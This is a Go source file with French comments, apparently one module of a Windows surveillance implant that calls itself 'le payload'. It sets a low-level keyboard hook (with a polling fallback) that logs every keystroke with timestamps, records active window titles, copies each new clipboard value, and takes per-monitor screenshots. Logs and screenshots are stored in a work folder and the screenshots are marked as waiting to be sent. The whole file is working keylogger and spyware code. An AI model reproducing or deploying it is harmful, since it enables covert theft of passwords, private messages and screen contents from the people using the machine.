// Capture clavier, presse-papiers et fenêtre active.
//
// Deux mécanismes complémentaires :
//
//  1. un crochet bas niveau WH_KEYBOARD_LL — il voit chaque frappe, y compris
//     celles des fenêtres qui ont le focus, sans jamais intercepter la
//     touche (le crochet est passif) ;
//  2. une boucle de sondage qui note la fenêtre active et le presse-papiers,
//     et sert de repli si le crochet est refusé.
//
// La conversion passe par ToUnicodeEx et la disposition réellement installée
// (AZERTY comprise), avec un état de modificateurs lu par GetAsyncKeyState —
// GetKeyboardState ne convient pas depuis un fil sans file de messages.
package main

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

var (
	procGetAsyncKeyState  = user32DLL.NewProc("GetAsyncKeyState")
	procMapVirtualKey     = user32DLL.NewProc("MapVirtualKeyW")
	procToUnicodeEx       = user32DLL.NewProc("ToUnicodeEx")
	procGetKeyboardLayout = user32DLL.NewProc("GetKeyboardLayout")
	procGetForegroundWin  = user32DLL.NewProc("GetForegroundWindow")
	procGetWindowTextW    = user32DLL.NewProc("GetWindowTextW")
	procIsClipAvail       = user32DLL.NewProc("IsClipboardFormatAvailable")
	procOpenClipboard     = user32DLL.NewProc("OpenClipboard")
	procCloseClipboard    = user32DLL.NewProc("CloseClipboard")
	procGetClipboardData  = user32DLL.NewProc("GetClipboardData")
	procGlobalLock        = kernel32DLL.NewProc("GlobalLock")
	procGlobalUnlock      = kernel32DLL.NewProc("GlobalUnlock")

	procSetWindowsHookEx = user32DLL.NewProc("SetWindowsHookExW")
	procCallNextHookEx   = user32DLL.NewProc("CallNextHookEx")
	procUnhookWinHook    = user32DLL.NewProc("UnhookWindowsHookEx")
	procGetMessageW      = user32DLL.NewProc("GetMessageW")
	procTranslateMsg     = user32DLL.NewProc("TranslateMessage")
	procDispatchMsg      = user32DLL.NewProc("DispatchMessageW")
)

const cfUnicodeText = 13

var (
	klMu       sync.Mutex
	klBuf      strings.Builder
	klLastWin  string
	klLastClip string
)

/* ------------------------------------------------------------------ */
/* Fenêtre active                                                      */
/* ------------------------------------------------------------------ */

func foregroundTitle() string {
	hwnd, _, _ := procGetForegroundWin.Call()
	if hwnd == 0 {
		return ""
	}
	buf := make([]uint16, 512)
	n, _, _ := procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if n == 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

/* ------------------------------------------------------------------ */
/* Presse-papiers                                                      */
/* ------------------------------------------------------------------ */

func clipboardText() string {
	avail, _, _ := procIsClipAvail.Call(cfUnicodeText)
	if avail == 0 {
		return ""
	}
	// Plusieurs tentatives : le presse-papiers est volé par d'autres
	// processus pendant quelques millisecondes.
	for i := 0; i < 5; i++ {
		if ok, _, _ := procOpenClipboard.Call(0); ok == 0 {
			time.Sleep(15 * time.Millisecond)
			continue
		}
		h, _, _ := procGetClipboardData.Call(cfUnicodeText)
		if h == 0 {
			procCloseClipboard.Call()
			return ""
		}
		p, _, _ := procGlobalLock.Call(h)
		if p == 0 {
			procCloseClipboard.Call()
			return ""
		}
		var out []uint16
		// unsafe.Add pour l'arithmétique de pointeur : la forme convertissant
		// un uintptr calculé en unsafe.Pointer est refusée par go vet.
		base := uptr(p)
		for i := 0; i < 32768; i++ {
			c := *(*uint16)(unsafe.Add(base, i*2))
			if c == 0 {
				break
			}
			out = append(out, c)
		}
		procGlobalUnlock.Call(h)
		procCloseClipboard.Call()
		return syscall.UTF16ToString(out)
	}
	return ""
}

/* ------------------------------------------------------------------ */
/* Clavier                                                             */
/* ------------------------------------------------------------------ */

// specialKey rend les touches non imprimables lisibles.
func specialKey(vk uintptr) (string, bool) {
	switch vk {
	case 0x08:
		return "[BKSP]", true
	case 0x09:
		return "[TAB]", true
	case 0x0D:
		return "[ENTER]\n", true
	case 0x1B:
		return "[ESC]", true
	case 0x20:
		return " ", true
	case 0x2D:
		return "[INS]", true
	case 0x2E:
		return "[DEL]", true
	case 0x25:
		return "[←]", true
	case 0x26:
		return "[↑]", true
	case 0x27:
		return "[→]", true
	case 0x28:
		return "[↓]", true
	case 0x5B, 0x5C:
		return "[WIN]", true
	}
	if vk >= 0x70 && vk <= 0x7B { // F1..F12
		return fmt.Sprintf("[F%d]", vk-0x6F), true
	}
	return "", false
}

// keyboardState construit l'état clavier attendu par ToUnicodeEx.
//
// GetKeyboardState ne convient pas ici : il lit l'état du fil de la file de
// messages, et ce fil n'en traite aucun (le payload tourne en tâche de fond),
// donc l'état reste vide et ToUnicode échoue sur toutes les lettres
// accentuées. On interroge donc chaque modificateur avec GetAsyncKeyState,
// qui est global à la session.
func keyboardState() []byte {
	kb := make([]byte, 256)
	for _, vk := range []uintptr{
		0x10, 0xA0, 0xA1, // Maj
		0x11, 0xA2, 0xA3, // Ctrl
		0x12, 0xA4, 0xA5, // Alt
		0x14,       // Verr. Maj (état bascule)
		0x90, 0x91, // Verr. Num / Défil.
	} {
		cur, _, _ := procGetAsyncKeyState.Call(vk)
		if vk == 0x14 {
			// Bit 0 = bascule (allumé/éteint), pas l'appui.
			if cur&0x0001 != 0 {
				kb[vk] = 0x01
			}
			continue
		}
		if byte(cur>>8)&0x80 != 0 {
			kb[vk] = 0x80
		}
	}
	return kb
}

// vkToText convertit un code virtuel en texte, via la disposition réelle.
func vkToText(vk uintptr) string {
	if s, ok := specialKey(vk); ok {
		return s
	}
	// 0x01..0x1B couvre les touches de contrôle ; on ignore le reste de la
	// plage sauf les caractères imprimables.
	if vk < 0x20 {
		return ""
	}

	kb := keyboardState()
	hkl, _, _ := procGetKeyboardLayout.Call(0)  // disposition du fil courant
	scan, _, _ := procMapVirtualKey.Call(vk, 0) // MAPVK_VK_TO_VSC

	buf := make([]uint16, 8)
	r, _, _ := procToUnicodeEx.Call(vk, scan, uintptr(unsafe.Pointer(&kb[0])),
		uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)), 0, hkl)
	if int32(r) < 0 {
		// Touche morte (accent circonflexe, tréma) : rien à écrire encore,
		// la lettre suivante portera l'accent via ToUnicodeEx.
		return ""
	}
	if r == 0 {
		if vk >= 0x20 && vk <= 0x6E {
			return fmt.Sprintf("[%s]", syscall.UTF16ToString([]uint16{uint16(vk)}))
		}
		return ""
	}
	return syscall.UTF16ToString(buf[:r])
}

// keyHeld dit si une touche virtuelle est enfoncée (état asynchrone).
func keyHeld(vk uintptr) bool {
	cur, _, _ := procGetAsyncKeyState.Call(vk)
	return byte(cur>>8)&0x80 != 0
}

// keylogLoop entretient deux choses : le crochet clavier (démarré une fois) et
// le sondage de la fenêtre active et du presse-papiers. Quand le crochet est
// actif, le sondage ne relit pas les touches : le crochet les voit toutes,
// alors qu'un sondage à 30 ms en rate.
func keylogLoop() {
	go keyboardHookLoop()
	time.Sleep(300 * time.Millisecond) // laisse le crochet s'installer

	prev := make([]byte, 256)
	first := true

	for {
		time.Sleep(30 * time.Millisecond)

		// !stop : on vide le tampon puis on rend la main.
		if stopped.Load() {
			klFlushNow()
			return
		}
		// Fenêtre active : on marque le changement.
		if t := foregroundTitle(); t != "" && t != klLastWin {
			klLastWin = t
			klAppend("\n[win " + time.Now().Format("15:04:05") + "] " + t + "\n")
		}

		if !hookActive.Load() {
			ctrl := keyHeld(0x11)
			alt := keyHeld(0x12)

			for vk := uintptr(1); vk < 256; vk++ {
				cur, _, _ := procGetAsyncKeyState.Call(vk)
				pressed := byte(cur>>8) & 0x80
				if pressed == 0 {
					prev[vk] = 0
					continue
				}
				if prev[vk] != 0 { // maintenue : on n'écrit qu'au premier appui
					continue
				}
				prev[vk] = pressed
				if first {
					// Premier tour : on ignore l'état déjà présent à
					// l'ouverture, sinon la touche enfoncée au lancement part
					// toute seule.
					continue
				}
				if t := keyToText(vk, ctrl, alt); t != "" {
					_ = t
				}
			}
			first = false
		}

		// Presse-papiers : on note une seule fois chaque nouvelle valeur.
		if c := clipboardText(); c != "" && c != klLastClip && len(c) < 4000 {
			klLastClip = c
			klAppend("\n[CLIP " + time.Now().Format("15:04:05") + "] " +
				strings.ReplaceAll(c, "\r", "") + "\n")
		}
	}
}

// keyToText convertit et journalise une frappe, avec horodatage de reprise
// après 20 s d'inactivité et notation des raccourcis Ctrl/Alt.
func keyToText(vk uintptr, ctrl, alt bool) string {
	switch vk {
	case 0x10, 0x11, 0x12, 0x14, 0x90, 0x91, // Maj, Ctrl, Alt, Verr Maj/Num
		0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5: // Maj/Ctrl/Alt gauche et droite
		return ""
	}
	t := vkToText(vk)
	if t == "" {
		return ""
	}
	now := time.Now()
	keyMu.Lock()
	if klLastKeyAt.IsZero() || now.Sub(klLastKeyAt) > 20*time.Second {
		klAppend("\n[" + now.Format("15:04:05") + "] ")
	}
	klLastKeyAt = now
	keyMu.Unlock()

	if ctrl || alt {
		mod := "CTRL"
		if alt {
			mod = "ALT"
		}
		klAppend("[" + mod + "+" + strings.Trim(t, "[]") + "]")
	} else {
		klAppend(t)
	}
	return t
}

/* ------------------------------------------------------------------ */
/* Crochet clavier bas niveau (WH_KEYBOARD_LL)                         */
/* ------------------------------------------------------------------ */

const (
	whKeyboardLL = 13
	wmKeyDown    = 0x0100
	wmSysKeyDown = 0x0104
)

type kbdLLHookStruct struct {
	VKCode    uint32
	ScanCode  uint32
	Flags     uint32
	Time      uint32
	ExtraInfo uintptr
}

// winMsg reproduit la structure MSG (48 octets en 64 bits).
type winMsg struct {
	hwnd     uintptr
	message  uint32
	_        uint32
	wParam   uintptr
	lParam   uintptr
	time     uint32
	ptX      int32
	ptY      int32
	lPrivate uint32
}

var (
	hookCallback uintptr // gardé en vie : le GC ne doit pas le récupérer
	hookActive   atomic.Bool
	keyMu        sync.Mutex
	klLastKeyAt  time.Time
)

// keyboardHookLoop installe le crochet et pompe la file de messages du fil.
// Le crochet est passif : il observe, ne bloque aucune touche, et n'exige pas
// de privilège particulier.
func keyboardHookLoop() {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hookCallback = syscall.NewCallback(func(nCode, wParam, lParam uintptr) uintptr {
		if int32(nCode) >= 0 && (wParam == wmKeyDown || wParam == wmSysKeyDown) {
			k := (*kbdLLHookStruct)(uptr(lParam))
			keyToText(uintptr(k.VKCode), keyHeld(0x11), keyHeld(0x12))
		}
		r, _, _ := procCallNextHookEx.Call(0, nCode, wParam, lParam)
		return r
	})

	h, _, err := procSetWindowsHookEx.Call(whKeyboardLL, hookCallback, 0, 0)
	if h == 0 {
		plog("clavier: crochet refusé, repli sur le sondage (" + err.Error() + ")")
		return
	}
	hookActive.Store(true)
	defer func() {
		hookActive.Store(false)
		procUnhookWinHook.Call(h)
	}()

	var msg winMsg
	for {
		r, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if int32(r) <= 0 {
			return
		}
		procTranslateMsg.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMsg.Call(uintptr(unsafe.Pointer(&msg)))
	}
}

func klAppend(s string) {
	if s == "" {
		return
	}
	klMu.Lock()
	if klBuf.Len() > 256*1024 {
		// Le tampon mémoire ne grossit pas au-delà d'un quart de méga : au
		//-delà on pousse sur le disque.
		klMu.Unlock()
		klFlushNow()
		klMu.Lock()
	}
	klBuf.WriteString(s)
	klMu.Unlock()
}

// keylogFlush écrit sur disque ce qui a été saisi depuis le dernier appel.
func keylogFlush() {
	klFlushNow()
	trimFile(workPath("kl.log"), cfg.MaxLogKB)
}

func klFlushNow() {
	klMu.Lock()
	if klBuf.Len() == 0 {
		klMu.Unlock()
		return
	}
	chunk := klBuf.String()
	klBuf.Reset()
	klMu.Unlock()

	f, err := os.OpenFile(workPath("kl.log"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	_, _ = f.WriteString(chunk)
	f.Close()
}

/* ------------------------------------------------------------------ */
/* Captures d'écran                                                    */
/* ------------------------------------------------------------------ */

var (
	shotMu  sync.Mutex
	shotSeq int
)

// shotList liste les captures en attente d'envoi.
func shotList() []string {
	shotMu.Lock()
	defer shotMu.Unlock()
	var out []string
	entries, err := os.ReadDir(workDir())
	if err != nil {
		return out
	}
	for _, e := range entries {
		if !e.IsDir() && strings.HasSuffix(e.Name(), ".png") {
			out = append(out, filepathJoin(workDir(), e.Name()))
		}
	}
	return out
}

func filepathJoin(a, b string) string {
	return a + string(os.PathSeparator) + b
}

// screenshotFlush prend une capture par écran et l'écrit dans le dossier de
// travail : chaque moniteur a son fichier (shot-…-01.png, -02.png, …).
func screenshotFlush() {
	shots := captureScreensPNG()
	if len(shots) == 0 {
		return
	}
	shotMu.Lock()
	defer shotMu.Unlock()
	stamp := time.Now().Format("060102-150405")
	for i, data := range shots {
		if len(data) == 0 {
			continue
		}
		shotSeq++
		name := fmt.Sprintf("shot-%s-%02d.png", stamp, shotSeq)
		path := filepathJoin(workDir(), name)
		if err := os.WriteFile(path, data, 0600); err != nil {
			plog("capture: écriture impossible " + err.Error())
			continue
		}
		plog(fmt.Sprintf("capture: %s (écran %d/%d)", name, i+1, len(shots)))
	}
}
